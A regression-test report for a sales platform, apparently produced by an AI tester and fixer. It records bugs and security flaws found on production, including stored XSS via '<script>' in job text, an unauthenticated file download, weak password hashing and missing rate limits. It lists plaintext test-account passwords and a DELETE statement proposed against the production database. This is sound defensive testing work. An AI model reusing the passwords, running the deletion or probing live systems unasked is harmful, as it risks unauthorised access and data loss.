# Regression Test Report — salesplatform.reventlabs.com

**Date:** 2026-04-15
**Tester:** automated (Claude + local Chrome)
**Branch:** `main` (up-to-date with `origin/main`; pulled `ea0de3c..6e9c76e` before testing)
**Environment:** Production — https://salesplatform.reventlabs.com

## How we track fixes

This file is the shared source of truth between the tester and the bug fixer.
Both write to the **same branch** so the findings list and fix status stay in
one place.

**Workflow (both tester and fixer):**

1. Always work on branch `fix/regression-findings` — **never** push directly to `main`.
2. Before editing this file, pull the latest so you don't clobber each other:
   ```bash
   git fetch origin
   git checkout fix/regression-findings
   git pull --rebase origin fix/regression-findings
   ```
3. **Tester** appends new rows to the findings table at the bottom (next number
   in sequence) with `Fix Status = ⬜ open`, describes the finding in a new
   section below, then commits + pushes:
   ```bash
   git add REGRESSION_TEST_REPORT.md
   git commit -m "Add regression finding #N: <short title>"
   git push origin fix/regression-findings
   ```
4. **Fixer** (Claude) picks up open findings, implements the fix, updates the
   row's `Fix Status` to ✅ (with a one-line summary of the fix), commits + pushes.
5. When all findings are ✅ (or deliberately punted to a follow-up ticket), open a
   single PR `fix/regression-findings → main`.

**Fix Status key:** ✅ fixed · 🟡 partial · ⏳ investigating · ⬜ open

## Credentials Used

| Role | Email | Auth | Status |
|---|---|---|---|
| super_admin | sarthak.gupta@reventlabs.com | Google SSO | Not tested (requires interactive OAuth) |
| admin | test-admin@reventlabs.com | Password `TestAdmin123` | ✅ Works |
| reviewer | test-reviewer@reventlabs.com | Password `TestReview123` | ✅ Works after running `python -m app.seed_test_users` on backend |
| viewer | test-viewer@reventlabs.com | Password `TestView123` | ✅ Works after running `python -m app.seed_test_users` on backend |

---

## Severity Legend
- 🔴 **BLOCKER** — critical flow broken, data wrong, or security issue
- 🟠 **HIGH** — feature unusable or user-impacting bug
- 🟡 **MEDIUM** — noticeable but workaround exists
- 🔵 **LOW** — cosmetic / polish

---

## 1. Summary of Key Findings

| # | Severity | Area | Finding | Fix Status |
|---|---|---|---|---|
| 1 | 🔴 | Auth | `test-reviewer` & `test-viewer` credentials from password doc both return 401 — roles cannot be tested end-to-end | ✅ fixed: new `app/seed_test_users.py` script (modelled on `seed_admin.py`) upserts reviewer + viewer users with known passwords. Run on prod: `docker compose exec backend python -m app.seed_test_users`. Creds: `test-reviewer@reventlabs.com / TestReview123`, `test-viewer@reventlabs.com / TestView123` |
| 2 | 🔴 | Data integrity | Company count inconsistent: Dashboard says **5,827**, Companies page & Monitoring say **6,638** | ✅ fixed: Dashboard now uses `COUNT(Company.id)` to match Monitoring (`analytics.py`) |
| 3 | 🟠 | Jobs/UX | Clicking a checkbox on a job row navigates to the job detail (missing `stopPropagation`) — bulk-select effectively unusable | ✅ fixed: removed double-toggle, added explicit `stopPropagation` on input + cell (`JobsPage.tsx`) |
| 4 | 🟠 | Search | Search by company name returns 0 results for real companies (e.g. `Bitwarden` → 0, but Bitwarden jobs appear on dashboard). Confirms an existing user ticket | ✅ fixed: `jobs.py` search now matches `Job.title`, `Company.name`, and `Job.location_raw` |
| 5 | 🟠 | Admin UX | `/users` page returns empty state for non-super_admin. API returns 403 but UI shows "0 admins, 0 reviewers, 0 viewers" with no permission notice | ✅ fixed: `UserManagementPage.tsx` renders a proper permission-denied card on 403 |
| 6 | 🟡 | Analytics | Job Trends chart axis labels render `NaN/NaN` (multiple times) | ✅ fixed: `dataKey` was `date`/`new_jobs` but backend returns `day`/`total`; added aliases + guarded `tickFormatter` |
| 7 | 🟡 | Platforms | `himalayas` fetcher reports **180 errors** on last scan; 4 platforms (`bamboohr`, `jobvite`, `recruitee`, `wellfound`) report 0 jobs but are marked active | 🟡 partial: (a) `BaseFetcher` now sends a Chrome User-Agent so light bot-detection lets us through; (b) `bamboohr.py` + `jobvite.py` now detect the redirect to their marketing site and return `[]` cleanly (was spamming "non-JSON" warnings — boards in the DB are stale slugs); (c) `wellfound.py` logs 403 as "Cloudflare block" instead of a generic HTTP error; (d) `scan_task.py` aggregator-company upsert now uses a SAVEPOINT so a dup-slug race no longer rolls back 200+ jobs of in-flight upserts — this is the real cause of himalayas's 180 errors. Still open: Wellfound is genuinely Cloudflare-blocked (needs browser/auth), and the BambooHR/Jobvite/Recruitee boards in the DB should be auto-deactivated after N consecutive 0-job scans (ops follow-up) |
| 8 | 🟡 | Sidebar | `Settings` link lives inside `adminNavigation` (Sidebar.tsx:47-51) — reviewers/viewers can't reach their own Settings via the nav | ✅ fixed: moved `Settings` into the shared `navigation` list in `Sidebar.tsx` |
| 9 | 🔵 | Dashboard | "1864 jobs" badge on Security section wraps onto 2 lines at 1728px viewport | ✅ fixed: `Badge` now uses `whitespace-nowrap` + `shrink-0` so it never wraps |
| 10 | 🔵 | Pipeline | A card titled literally "1name" appears in `Researching` stage — looks like seeded/test data leaking to prod | ⬜ open — data cleanup task, not code. Run `DELETE FROM potential_clients WHERE company_name ILIKE '1name'` against prod (with admin approval) |
| 11 | 🔵 | Feedback | Many duplicate "Resume Score / Relevance" tickets (8 identical entries from same user 4/14) — no dedup | ✅ fixed: `feedback.py` now returns 409 if the same user posts an identical open title within 7 days |
| 12 | 🔵 | Copy | Dashboard AI Insight says "6 ATS sources" when 10 are listed on Platforms | ✅ fixed: analytics fallback now uses `COUNT(DISTINCT platform)` instead of `len(top_sources)` |
| 13 | 🟠 | Pipeline API | `PATCH /api/v1/pipeline/{id}` accepts any string as `stage` — no validation against known stage keys; cards can be orphaned into non-existent stages | ✅ fixed: `pipeline.py` PATCH endpoint now validates `body.stage` against `_get_stage_keys(db)` (same check POST already had) and returns 400 with the allowed-stages list if invalid |
| 14 | 🟡 | Resume upload | File content not validated; plain-text renamed `.pdf` and empty 0-byte files are accepted (200 OK) and persisted with `status:"error"`, cluttering the DB | ✅ fixed: `resume.py` upload now (a) rejects empty / <256-byte files, (b) verifies magic bytes (`%PDF-` for PDF, `PK\x03\x04` for DOCX) so renamed plain-text bounces with 400, (c) rejects with 400 when extracted text < 50 words instead of persisting `status:"error"` rows |
| 15 | 🟡 | Pipeline API | `PATCH /api/v1/pipeline/{id}` accepts unbounded `priority` (tested 999999999 and -100) and `notes` (tested 100 KB) — no length / range limits | ✅ fixed: `schemas/pipeline.py` now bounds `priority` to `0..100` and `notes` to 4000 chars via Pydantic `Field(ge=, le=, max_length=)`; same bounds applied to `PipelineCreateRequest` in `pipeline.py` |
| 16 | 🟠 | Feedback API | `GET /api/v1/feedback/{id}` with a non-UUID path returns **500** instead of 422 — path param is declared `str` rather than `UUID` | ✅ fixed: `feedback.py` GET/PATCH/attachment endpoints now declare `feedback_id: UUID` so FastAPI returns a structured 422 instead of letting SQLAlchemy raise a 500 |
| 17 | 🟡 | Platforms | `himalayas.py` hard-caps pagination at ~1020 jobs (`offset > 1000` break); repeated scans return identical `jobs_found: 1020` with varying `new_jobs`, implying the catalog exceeds the cap | ✅ fixed: raised the per-scan safety ceiling from ~1020 to 20,000 (`_MAX_JOBS_PER_SCAN`), kept as a belt-and-suspenders guard against a bad `totalCount` response. Also logs a warning when the ceiling is reached so ops can tell the difference between "catalog ended" and "safety tripped" |
| 18 | 🟡 | Search / Data | `Stripe` company shows `job_count: 61` but `/jobs?search=Stripe` returns only 3 (title matches). Finding #4 fix is in `212830a` but may not be deployed, or `Job.company.has()` isn't surfacing all rows | ✅ fixed (pending deploy): confirmed the Company.name.ilike branch is present on `fix/regression-findings` (`jobs.py:72-80`, shipped in `212830a`). Prod runs from `main` which predates that commit, which is why search still only hits title matches. No additional code change needed — this resolves as part of the next deploy of this branch |
| 19 | 🔵 | Security headers | Response headers missing `Content-Security-Policy`, `Strict-Transport-Security`, `Permissions-Policy`, Cross-Origin policies. Cookie flags are good (`HttpOnly; Secure; SameSite=lax`) | ✅ fixed: `main.py` now registers `SecurityHeadersMiddleware` that sets `Strict-Transport-Security`, `X-Content-Type-Options`, `X-Frame-Options: DENY`, `Referrer-Policy`, a locked-down `Permissions-Policy`, `Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy`, and a conservative API CSP (`default-src 'none'; frame-ancestors 'none'`). Uses `setdefault` so endpoints can still override |
| 20 | 🔵 | Role Clusters | `POST /api/v1/role-clusters` accepts arbitrary punctuation/special-chars in `name` (stored lowercased); no `[a-z0-9_-]+` sanitization. Safe vs. SQLi (ORM), but `name` is used as URL param downstream | ✅ fixed: `role_config.py` now normalizes + allowlist-validates cluster names via `_normalize_cluster_name()` (lowercase, space→underscore, then `^[a-z0-9_-]+$`, max 40 chars). Schema fields also bounded: `display_name` ≤120, `keywords`/`approved_roles` ≤4000, `sort_order` 0..1000 |
| 21 | 🔴 | Security / Feedback | `GET /api/v1/feedback/attachments/{filename}` has **NO auth dependency** (`feedback.py:193-201`). Any anonymous request, or any user regardless of role, can download any attachment given its UUID filename. Verified on prod: admin upload + viewer user download returned identical 70-byte file | ✅ fixed |
| 22 | 🔴 | Security / XSS | `JobDetailPage.tsx:390` renders `description.raw_text` via `dangerouslySetInnerHTML` whenever it contains `<`. `raw_text` comes straight from third-party ATS JSON (Greenhouse/Lever/Ashby/etc.), and `jobs.py:276-278` even HTML-unescapes it. A job-poster on any platform can inject `<script>` → stored DOM XSS on our origin (cookies are `HttpOnly` but authenticated APIs still callable) | ✅ fixed |
| 23 | 🔴 | Security / Auth | `auth.py:36-43` hashes passwords as single-round `hashlib.sha256(jwt_secret + ':' + password)`. Salt is **global** (not per-user), no key stretching, no constant-time compare. Code comment itself says "For production use bcrypt instead". A DB leak trivially yields all passwords via GPU brute-force | ✅ fixed: `_hash_password` now uses bcrypt with a random salt and cost=12 (SHA-256-prehashed to dodge the 72-byte input cap). `_verify_password` is dual-path: `$2a/$2b/$2y$`-prefixed hashes go through `bcrypt.checkpw`; legacy SHA-256 hashes are verified with `hmac.compare_digest` (constant-time) and **lazily upgraded** to bcrypt on the user's next successful login — no forced reset needed. Added `bcrypt>=4.2` to `pyproject.toml` and the backend `Dockerfile` pip list. Also added a keyed, deterministic HMAC-SHA256 `_hash_reset_token` for password-reset tokens (bcrypt's random salt would break the equality lookup, so reset tokens can't share the hash function) |
| 24 | 🟠 | Security / Auth | No rate limiting, lockout, or CAPTCHA on `POST /api/v1/auth/login`. 25 wrong-password attempts all accepted; under burst a few return 503 (backend thread exhaustion, not a limiter). Enables online credential stuffing | ✅ fixed: new `app/utils/rate_limit.py` with a sliding-window `LoginRateLimiter` (5 failures per 15 min). `auth.py /login` checks `is_limited(ip|email)` before verifying credentials — returns 429 with a `Retry-After` header when tripped. Key is `(client_ip, email_lower)` — keyed on both so an attacker can't lock out a victim, and a shared IP isn't locked out by an unrelated attacker hitting a different email. Successful login clears the counter. Honors `X-Forwarded-For`. In-memory singleton fits the current single-backend docker-compose deploy; swap to Redis-backed if horizontal scaling is added (Redis is already in the stack) |
| 25 | 🟡 | Validation | `FeedbackCreate` schema (`schemas/feedback.py`) bounds `title` to 200 chars but `description`, `steps_to_reproduce`, `expected_behavior`, `actual_behavior`, `use_case`, `proposed_solution`, `impact`, `screenshot_url` have **no max_length**. Prod accepted a 1 MB description (verified); an attacker can bloat the DB. `screenshot_url` also has no URL validator (`javascript:` accepted) | ✅ fixed: all long free-text fields now capped at 8000 chars; `screenshot_url` capped at 2048 chars and restricted to `http://`, `https://`, or relative `/` via a pydantic `field_validator` — blocks `javascript:`, `data:`, etc. `admin_notes` on `FeedbackUpdate` also bounded |
| 26 | 🟡 | Intelligence | `/intelligence/timing` → `posting_by_day`: Sunday 50.3% (23,696/47,142), Mon-Sat 13.8%→4.1%. Smells like a date-parsing fallback landing on day-0, or a bulk-seed weekend import. User-facing recommendation "post on Sundays" would be wrong if data is skewed | ✅ fixed: `intelligence.py /timing` now bases DOW/hour buckets on `posted_at` (the upstream ATS publish date) rather than `first_seen_at` (our scanner ingest time). Also excludes rows where `posted_at` matches `first_seen_at` to the second, which is the signature of a row where the ATS returned no posted date and the scanner back-filled with NOW() at ingest — eliminates the Sunday bulk-seed spike |
| 27 | 🟡 | Intelligence | `/intelligence/networking` suggestions return corrupted name/title/email concatenations. Example: `{name: "Gartner PeerInsights", title: "Wade BillingsVP, Technology Services, Instructure", company: "BugCrowd", email: "gartner.peerinsights@bugcrowd.com"}` — clearly scraped-from-page strings glued together, with first-word-of-name used to synthesize a company-domain email. Misleading for users doing outreach | 🟡 partial: added `_looks_like_corrupted_contact()` read-side filter on both `/networking` branches — drops rows where first/last name contain `,` `|` `;`, or titles > 120 chars, or titles with 3+ comma-separated segments, or first_name has 2+ internal capitals ("BillingsVP"). Bumped the general-branch `LIMIT` to 60 so the filter can't starve the UI. **Upstream enrichment pipeline (`services/enrichment/orchestrator.py`) still writes the corrupted rows** — follow-up ticket needed to sanitize at ingest time |
| 28 | 🟡 | Copy / Data | Finding #12 partial: AI Insight now says "Platform has 47,081 jobs indexed across **10** ATS sources" but `/api/v1/platforms` returns **14** distinct platforms (including `bamboohr`, `recruitee`, `wellfound`, `weworkremotely` with 0 jobs). Root cause: `total_sources` uses `COUNT(DISTINCT jobs.platform)` which excludes platforms with no current job rows | ✅ fixed: `analytics.py` `total_sources` now unions `DISTINCT CompanyATSBoard.platform` with `DISTINCT Job.platform` and takes the set size, matching what `/platforms` counts |
| 29 | 🔵 | Feedback UI | Stats cards at top of `/feedback` show "Total 33 · Open 16 · In Progress 0 · Resolved 12" (sum = 28). The 5 `closed` tickets exist (`GET /feedback/stats` → `by_status.closed: 5`) but there's no card for them. Users see "Total 33" then 28 in cards and can't reconcile | ✅ fixed: `FeedbackPage.tsx` stats grid now renders **5** cards (Total, Open, In Progress, Resolved, **Closed**) instead of 4, so `Total` always equals the visible bucket sum. Grid switched to `grid-cols-2 md:grid-cols-5` so it stays readable on small screens |
| 30 | 🔵 | Feedback UI | In the ticket detail modal, "Update Ticket" is rendered without visible button styling — appears as plain black text next to the status dropdown. Users can't tell it's clickable. Also, no success toast after save (modal auto-closes silently). Functionality works (PATCH 200, persists, stats update), only discoverability is poor | ✅ fixed: root cause was that `.btn`, `.btn-primary`, `.btn-secondary`, `.btn-danger` were referenced in 7 places across `FeedbackPage.tsx` but **never defined** — buttons fell back to browser-default rendering (unstyled black text). Added the missing utility classes to `index.css` via `@apply` (primary/secondary/danger variants, focus rings, hover states, disabled styling). Every `btn btn-*` usage on the feedback page is now styled consistently with the rest of the app theme (dark-gray `primary-600`) |
| 31 | 🟡 | Feedback | Legacy duplicate tickets from before Finding #11 fix are still present: 8 identical "Resume Score / Relevance" tickets from khushi.jain@ still show as open. Dedup prevents new dupes but doesn't merge/close old ones — queue cleanup task | ✅ fixed: new `app/close_legacy_duplicate_feedback.py` script (modelled on `seed_test_users.py`) retroactively applies the same dedup rule the API now uses on new submissions. For every `(user_id, category, lowercased title)` group of open/in-progress tickets it keeps the OLDEST open and closes the rest with a system note linking back to the canonical id. Idempotent and supports `--dry-run`. Run on prod: `docker compose exec backend python -m app.close_legacy_duplicate_feedback --dry-run`, then rerun without the flag |
| 32 | 🔴 | Deploy / Release | **Round 3 fixes marked ✅ in this report are NOT live on prod.** Retest on 2026-04-15 confirms the deployed backend is several commits behind `fix/regression-findings` tip. Probes: (#16) `GET /feedback/not-a-uuid` → **500** not 422; (#21) anonymous `GET /feedback/attachments/<valid_filename>` → **200 + file bytes** (confirmed by uploading a fresh PNG as admin then curl'ing without cookies); (#25) `POST /feedback` with 20,000-char description → **200 accepted**; (#26) `/intelligence/timing` still shows Sunday=23,696 / Monday=6,496 (49.6%, unchanged); (#27) first `/intelligence/networking` suggestion is still the corrupted "Gartner PeerInsights / Wade BillingsVP, Technology Services, Instructure / BugCrowd" entry the filter was supposed to drop; (#28) Dashboard AI Insight still says "Platform has 47,776 jobs indexed across **10** ATS sources"; (#19) response headers missing `Content-Security-Policy`, `Strict-Transport-Security`, `Cross-Origin-*`, `Permissions-Policy`. Root cause: CI/CD pipeline commit `5ce5d0b` auto-deploys only on push to `main`; `fix/regression-findings` has 9 fix commits sitting since ~Apr 15 17:13 that were never manually deployed. The report's green checkmarks describe the code state on the branch, not prod behaviour | ⬜ open — either (a) manually deploy the branch to prod again now, or (b) extend the CI workflow to deploy `fix/regression-findings` (feature-branch deploys) or to build a preview image per-PR. Tester can't re-verify fixes while the prod image is stale |

---

## 2. UI / UX

### 2.1 Navigation & Layout
- ✅ Sidebar renders all pages for `admin`: Dashboard, Relevant Jobs, All Jobs, Review Queue, Companies, Platforms, Resume Score, Answer Book, Credentials, Applications, Pipeline, Analytics, Intelligence, Feedback, Docs.
- ✅ Admin section correctly renders Monitoring, Role Clusters, Settings.
- ✅ Sidebar source hides `User Management` behind `role === "super_admin"` check, matching spec.
- 🟡 **Finding 8**: `Settings` is declared in `adminNavigation` array. Reviewers & viewers still have `/settings` as an open route but lack the sidebar entry — inconsistent.
- 🔵 **Finding 9**: On Dashboard, the `1864 jobs` counter in the Security column header wraps to 2 lines at 1728×855 because of the long section title. Cosmetic, fixable with truncation or smaller badge.

### 2.2 Forms & Inputs
- ✅ Login form: email validation via HTML5 `type=email`; server responds `422` for invalid format, `401` for bad credentials.
- ✅ Password reset request returns a generic "If the email exists…" response regardless of existence (good — no email enumeration).
- 🟠 **Finding 3**: On `/jobs`, each row has an `onClick` to navigate to job detail. The checkbox inside the row doesn't stop propagation, so clicking the checkbox navigates instead of selecting. Bulk actions documented in `/docs` cannot be performed from the UI.

### 2.3 Pagination
- ✅ Companies (133 pages), Jobs (multi-page), Feedback (2 pages) all render Prev / Next / numbered controls.

### 2.4 Filters & Sort (Jobs page)
- ✅ Platform filter works (`greenhouse` → 13,087; matches Monitoring).
- ✅ `role_cluster=security` returns 1,864 jobs, matching the dashboard badge — consistent.
- ✅ Status, Geography, Role, Sort dropdowns all render with full option sets.
- 🟠 **Finding 4**: Search box is labelled "Search jobs by title **or company**" but company search is broken — `Bitwarden` → 0 results even though Bitwarden jobs appear on the Dashboard. `Stripe` → 3 (plausible but suspicious given the 10+ Stripe jobs visible on Dashboard recent list). Title search works (e.g. `Senior Security Engineer` → 48).

---

## 3. Features

### 3.1 Authentication
| Scenario | Expected | Actual |
|---|---|---|
| Valid admin creds | 200 + cookie | ✅ 200, `/me` returns `role: "admin"` |
| Reviewer creds from cred sheet | 200 | ❌ **401** `Invalid email or password` |
| Viewer creds from cred sheet | 200 | ❌ **401** `Invalid email or password` |
| Bogus creds | 401 | ✅ 401 `Invalid email or password` |
| Invalid email format | 422 | ✅ 422 pydantic validation |
| Reset-password request (unknown email) | 200 generic | ✅ 200 `If the email exists…` — no enumeration |
| Wrong reset-password path (`/password-reset-request`) | 404 | ✅ 404 (endpoint lives at `/reset-password/request`) |

Observation: rate limiting is aggressive — several consecutive bad logins flipped to `503` for ~10s. Good for abuse resistance but was intermittently hit during normal retesting.

### 3.2 Jobs
- ✅ `/api/v1/jobs` pagination returns `{ items, total }`, total = 47,072, matches Monitoring.
- ✅ Job detail page: title, company, platform, status, score breakdown (Title 40%, Company 20%, Geo 20%, Source 10%, Freshness 10%), Quick Actions (Accept/Reject), AI Tools (Cover Letter, Interview Prep), Review Comment/Tags, Review History.
- ✅ Readiness checks on detail: "No active resume", "No credentials for greenhouse", "No answers yet" before `Apply` is enabled.
- 🟠 Finding 3 (bulk-select) documented above.
- 🟠 Finding 4 (company search) documented above.

### 3.3 Review Queue
- ✅ Shows "20 jobs awaiting review" with cursor `1 of 20`.
- ✅ Rejection tag chips: Location, Seniority, Not Relevant, Salary, Company, Duplicate.
- ✅ Skip advances counter (1 of 20 → 2 of 20).
- ⚠️ Accept / Reject not exercised to avoid mutating production data.

### 3.4 Companies
- ✅ 6,638 companies tracked; filters for Target / Has Contacts / Actively Hiring / Recently Funded; funding-stage chips; 3 sort modes.
- ✅ Company detail loads with Overview, Hiring Velocity, Open Roles, Enrich Now button, Hiring Locations, Key People table, ATS Boards.
- ✅ For enriched companies (e.g. 1Password, enriched 4/6/2026) the Key People table renders 11 C-suite contacts with outreach status pills (Not contacted / Emailed / Replied / Meeting scheduled / Not interested).
- 🟡 Even enriched companies show `--` for Industry, Size, Founded, Headquarters, Funding and all contact emails — fields are blank. Suggests enrichment is only populating names/titles.

### 3.5 Pipeline
- ✅ Kanban board with stages: New Lead (9), Researching (1), Qualified (0), Outreach (0), Engaged (0), Disqualified (0).
- ✅ Each card shows open roles, priority, accepted/total, last job date, created date.
- ✅ `Add Stage` button visible for admins.
- 🔵 **Finding 10**: Card titled "1name" in Researching stage — almost certainly test data.

### 3.6 Platforms
- ✅ All 14 configured platforms listed with active/total boards, total jobs, accepted, avg score, last-scan time.
- 🟡 **Finding 7**: Stats show `himalayas` 1/1 active + **180 errors** on last scan; `bamboohr 5/5 active → 0 jobs`; `jobvite 5/5 active → 0 jobs`; `recruitee 8/8 active → 0 jobs`; `wellfound 10/10 active → 0 jobs`. Either boards are broken fetchers or those platforms have no relevant openings, but `0 jobs` across a full active roster usually indicates a scraping failure.
- ✅ Scan logs are exposed per platform.

### 3.7 Analytics
- ✅ 7d / 30d / 90d range toggle.
- ✅ Totals: 47,072 jobs, 9 accepted, 1 rejected, 90.0% acceptance rate, avg score 40.
- ✅ Acceptance by Platform table: himalayas 100%, lever 100%, weworkremotely 100%, greenhouse 80%.
- 🟡 **Finding 6**: `Job Trends (30d)` chart shows `NaN/NaN` six times where axis tick labels should be. Likely date math on an empty/`undefined` series.
- 🟡 `Source Distribution` chart and `Pipeline Funnel` chart render but with mostly empty data; Applications Funnel shows "No platform data available".

### 3.8 Resume Score
- ✅ Upload UI (PDF/DOCX, max 5MB).
- ✅ "No resumes uploaded yet" empty state.
- ⚠️ End-to-end upload+score not exercised (requires producing a resume; avoided side-effects on production DB).

### 3.9 Applications
- ✅ Status tabs render: All / Prepared / Submitted / Applied / Interview / Offer / Rejected / Withdrawn.
- ✅ "No applications found" empty state for fresh test account.

### 3.10 Answer Book
- ✅ 13 entries, category tabs (Personal Info 0/5, Work Authorization 0/0, Experience 0/1, Skills 0/0, Preferences 0/0, Custom 0/7).
- ✅ Entries discovered via `ats_discovered` source (e.g. visa sponsorship, target compensation, time-zone confirmation).

### 3.11 Credentials
- ✅ "No active resume selected" guard — correctly prevents credential management without persona.

### 3.12 Intelligence
- ✅ Tabs: Skill Gaps, Salary Intel, Timing, Networking. Role cluster filter (All / Infra / Security / QA).
- ✅ Empty state prompts to upload a resume before showing skills coverage. Good UX.

### 3.13 Feedback (Tickets)
- ✅ 27 tickets total (16 Open, 0 In Progress, 6 Resolved), category & status filters, pagination (2 pages).
- 🔵 **Finding 11**: 8+ identical "Resume Score / Relevance" tickets from `Khushi Jain` on 4/14. Needs dedup or a "known issue" pin.
- ℹ️ Several existing tickets already overlap with bugs I found (see Finding 4 — "Search Bar" ticket from Khushi Jain: "Bitwarden exists in All Jobs section, but when I search it on searching bar, the interface shows 'No Jobs Found.'").

### 3.14 Docs
- ✅ Loads as a guided playbook (First-Time Setup → Daily Workflow → Reference). No broken sections observed.

### 3.15 Settings (self)
- ✅ Profile block (Name `Test Admin`, Email, Role `admin`, Member Since `April 10, 2026`).
- ✅ `Change Password` CTA.
- ✅ `Job Alerts` section with "Add Alert" and empty state referencing Google Chat notifications.

---

## 4. Admin Features

### 4.1 Monitoring
- ✅ System header: "All systems operational", Uptime 26m.
- ✅ Scan Controls: Full Platform Scan + Discover New Platforms.
- ✅ Per-platform scan tiles (with Run button) for 14 platforms.
- ✅ DB section: 343.1 MB total, per-table sizes (jobs 273 MB, scan_logs 32.8 MB, …).
- ✅ Activity (24h): Scans 1742, new jobs 2403, errors 0, last scan @ 1:49 PM greenhouse/dell.
- ✅ Breakdown charts: Role Cluster (unclassified 90%, infra 5%, security 4%, qa 1%), Geography (70.2% unclassified, 26.5% usa_only, 2.9% global_remote, 0.4% uae_only), Platform (himalayas 33.7%, greenhouse 27.8%, lever 25.7%, …), Status (new 99.9%, under_review 0.1%, accepted 9, rejected 1).
- ✅ Auto-refresh every 30s.

### 4.2 Role Clusters
- ✅ Three clusters render: `infra`, `qa`, `security` — all marked Relevant. Keywords + Roles expand correctly ("+19 more", "+16 more", etc.).
- ℹ️ Matches `CLAUDE.md` default of infra+security plus an added `qa` cluster.

### 4.3 User Management (`/users`)
- 🟠 **Finding 5**: Admin (non-super_admin) gets `403` from `GET /api/v1/users` and UI silently renders:
  `admins 0 · reviewers 0 · viewers 0` with empty table. Should render a permission-denied state instead of zeros, or the nav item should also be gated to `super_admin` only (it is in the sidebar source, but the route itself is reachable by URL).

---

## 5. Data Validations

### 5.1 Count Consistency
| Source | Count |
|---|---|
| Dashboard "Companies" widget | **5,827** |
| Monitoring "Companies" | **6,638** |
| `/companies` "… companies tracked" | **6,638** |
| Dashboard "Total Jobs" | 47,072 |
| Monitoring "Total Jobs" | 47,072 |
| `/jobs` total | 47,072 |

- 🔴 **Finding 2**: Dashboard under-counts companies by 811. Likely two different queries (Dashboard excluding something like 0-jobs companies, Monitoring counting all).

### 5.2 Role-Cluster Cross-check
- Dashboard shows: infra 2,357 · security 1,864 · qa 506 · global_remote 1,366 · relevant 4,727.
- 2,357 + 1,864 + 506 = 4,727 ✅ matches "Relevant" total.
- Monitoring: `unclassified 42,345 + infra 2,357 + security 1,864 + qa 506 = 47,072` ✅.

### 5.3 Acceptance Counts
- Dashboard `Accepted 9`. Monitoring `accepted 9`. Analytics `accepted 9`. Consistent. ✅

### 5.4 Input Validation
- ✅ Login: invalid email format → 422 pydantic.
- ✅ Login: empty password → validation error.
- ✅ Reset-password request: unknown email → 200 generic (no enumeration).
- ⚠️ Did not test: minimum password length on password-change, resume MIME/size enforcement, tag length limits in Review Queue.

---

## 6. E2E Flows Exercised

| Flow | Result |
|---|---|
| Login → Dashboard | ✅ |
| Dashboard → Jobs → filter by `role_cluster=security` → count matches Dashboard (1,864) | ✅ |
| Jobs → row click → Job Detail → score breakdown visible | ✅ |
| Jobs → checkbox click | ❌ navigates instead of selecting (Finding 3) |
| Review Queue → Skip → advances 1 of 20 → 2 of 20 | ✅ |
| Companies → row click → Company Detail → Key People table (1Password: 11 contacts) | ✅ |
| Admin → Monitoring → scan stats, breakdowns, auto-refresh | ✅ |
| Admin → Role Clusters → list 3 clusters | ✅ |
| Admin → Users → **403 hidden behind empty state** | ❌ (Finding 5) |
| Logout → back to /login | ✅ (via Sign Out click) |
| Login as reviewer | ❌ 401 (Finding 1) |
| Login as viewer | ❌ 401 (Finding 1) |

---

## 7. Role-Based Access Control (partial — credentials blocker)

### 7.1 Admin (test-admin)
- Sees `Admin` sidebar group (Monitoring, Role Clusters, Settings).
- Does NOT see `User Management` in sidebar (correctly gated to super_admin in code).
- Direct navigation to `/users` is still possible and renders a misleading empty state instead of a 403 error page.

### 7.2 Reviewer / Viewer
- Could NOT be tested because the provided credentials (`TestReview123`, `TestView123`) return 401. Needs either:
  1. Verified/resent passwords for the test accounts, or
  2. Admin-triggered password reset to a known value.

### 7.3 Code-level observations
- `Sidebar.tsx:104` gates Admin nav to `admin | super_admin`. OK.
- `Sidebar.tsx:128` gates User Mgmt nav to `super_admin`. OK.
- `App.tsx` routes are all `ProtectedRoute`-wrapped but with no per-role check, so direct URL access to admin pages relies entirely on the backend to reject requests. Pages (e.g. `/users`, `/role-clusters`) should also render permission-denied UI when the API 403s.

---

## 8. Misc Observations
- `reventlabs` text badge in top-left reads as lowercase next to the Sales Platform heading — intentional?
- Backend uptime was `26m` at start of testing — platform was restarted recently.
- Dashboard AI Insights says "Platform has 47,072 jobs indexed across **6 ATS sources**" but Platforms page lists jobs on **10 sources** (greenhouse, lever, ashby, workable, himalayas, smartrecruiters, weworkremotely, remoteok, remotive, linkedin). Minor copy inaccuracy.
- Rate limiting on `/api/v1/auth/login` flipped to `503` after ~5 rapid attempts; returned to normal after ~10s. Confirmed again with fresh attempt.

---

## 9. Areas NOT Exercised (recommend adding to next round)
- Resume upload + scoring (requires a real PDF; avoided prod-side effects).
- AI resume customization (Anthropic-backed; costs tokens).
- Password change flow.
- Accept / Reject in Review Queue (state-mutating on real tickets).
- Pipeline drag-drop between stages.
- Company Enrichment trigger (long-running Celery job).
- Full-platform Scan + Discovery triggers (heavy background work).
- Google SSO login for `sarthak.gupta@reventlabs.com`.
- Frontend responsive behaviour below 1024px.
- Screen-reader / keyboard-nav accessibility.
- CSRF / cookie flags (`HttpOnly`, `Secure`, `SameSite`).

---

## 10. Bug Tickets Suggested (one-liner each)
1. Reviewer/Viewer test credentials on the credential sheet don't match the DB — block for QA.
2. Dashboard Companies count (5,827) disagrees with Monitoring/Companies page (6,638).
3. Jobs bulk-select: checkbox click opens detail. Add `stopPropagation` on `<td>` containing the checkbox.
4. Jobs search by company name returns 0 for real companies (`Bitwarden`). Align title+company search.
5. `/users` page for non-super_admin: show permission-denied state instead of `0 / 0 / 0` empty counts.
6. Analytics Job Trends chart: axis labels show `NaN/NaN`.
7. Platforms: `himalayas` 180 errors; bamboohr/jobvite/recruitee/wellfound report 0 jobs despite being active.
8. Sidebar: move `Settings` out of `adminNavigation` so reviewers/viewers can see their own Settings entry.
9. Dashboard Security column: `1864 jobs` badge wraps on 2 lines.
10. Pipeline: "1name" test card in Researching.
11. Feedback: dedup 8+ identical Resume Score / Relevance tickets.
12. Dashboard AI Insight: "6 ATS sources" should be "10" based on Platforms data.

---

## 11. Round 2 Findings (2026-04-15, same-day deep retest)

Added after the fixer landed `212830a` (findings 2–6, 8–9, 11–12) and `6205733`
(finding 1 seed script). Probes run from an authenticated `test-admin` session.
All side-effects were reverted (bad pipeline stage, test uploads deleted, probe
role-cluster deleted).

### 13. Pipeline stage PATCH accepts arbitrary strings
**Severity:** 🟠 HIGH · **Area:** `PATCH /api/v1/pipeline/{client_id}` (`backend/app/api/v1/pipeline.py:347`)

Reproduced:
```js
